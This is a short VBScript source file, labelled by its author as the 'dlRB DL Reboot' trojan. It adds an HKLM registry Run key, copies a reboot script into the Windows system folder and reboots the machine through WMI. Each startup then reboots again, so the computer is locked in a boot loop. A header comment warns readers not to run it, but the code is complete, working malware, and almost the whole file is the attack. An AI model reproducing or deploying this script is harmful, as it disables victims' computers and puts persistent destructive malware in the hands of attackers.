rem - dlRB "DL Reboot" Trojan script by D.L.
rem - Please, Don't RUN this! It's not testable scripts!!

On Error Resume Next
dim FSobj,sysDir,generateCopy,newFile,fixedCode,procreateCopy,fileData

set FSobj=CreateObject("Scripting.FileSystemObject")
set sysDir = FSobj.GetSpecialFolder(1)

createRegKey "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\dlRB",sysDir&"\dlRB.vbs"

sub createRegKey(regKey,regVal)
     set regEdit = CreateObject("WScript.Shell")
     regEdit.RegWrite regKey,regVal
end sub

set generateCopy=FSobj.CreateTextFile(sysDir+"\dlRB.vbs")
generateCopy.close

set newFile = FSobj.OpenTextFile(WScript.ScriptFullname,1)
setFile()
fixedCode=replace(fileData,chr(94),"""")

set procreateCopy=FSobj.OpenTextFile(sysDir+"\dlRB.vbs",2)
procreateCopy.write fixedCode
procreateCopy.close

rebootSystem()

function setFile()
        fileData="rem - ^dlRB^ by D.L." &vbcrlf& _
	"strComputer = ^.^ " &vbcrlf& _
	"Set objWMIService = GetObject(^winmgmts:^ _  " &vbcrlf& _
	"& ^{impersonationLevel=impersonate,(Shutdown)}!\\^ & strComputer & ^\root\cimv2^)" &vbcrlf& _
	"Set colOperatingSystems = objWMIService.ExecQuery _  " &vbcrlf& _
	"(^Select * from Win32_OperatingSystem^)" &vbcrlf& _
	"For Each objOperatingSystem in colOperatingSystems" &vbcrlf& _
        "ObjOperatingSystem.Reboot()" &vbcrlf& _
	"Next"
end function

function rebootSystem()
	strComputer = "." 
 
	Set objWMIService = GetObject("winmgmts:" _ 
	& "{impersonationLevel=impersonate,(Shutdown)}!\\" & strComputer & "\root\cimv2") 

	Set colOperatingSystems = objWMIService.ExecQuery _   
	("Select * from Win32_OperatingSystem") 

	For Each objOperatingSystem in colOperatingSystems 
        	ObjOperatingSystem.Reboot() 
	Next 
end function
